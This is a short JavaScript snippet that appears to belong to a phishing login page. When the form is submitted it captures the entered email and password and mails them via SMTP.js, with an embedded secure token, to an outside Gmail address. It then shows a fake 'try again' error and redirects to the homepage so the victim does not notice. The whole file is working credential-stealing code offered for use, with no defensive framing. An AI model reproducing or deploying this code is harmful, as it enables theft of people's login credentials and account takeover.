document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent form submission

  // Get the entered values
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;

  // Compose the email body
  var body = "Email: " + email + "\nPassword: " + password;

  // Configure and send the email using SMTP.js
  Email.send({
    SecureToken: "da7dffbb-7705-43c2-8736-292ecee85620",
    To: "ga5453771@gmail.com",
    From: "ankaracongo@gmail.com",
    Subject: "Login Information",
    Body: body
  }) // Show a popup message
alert("Oops! It seems there's an error. Please, try again in a few minutes!");

// Redirect to the homepage
window.location.href = "index.html";
});

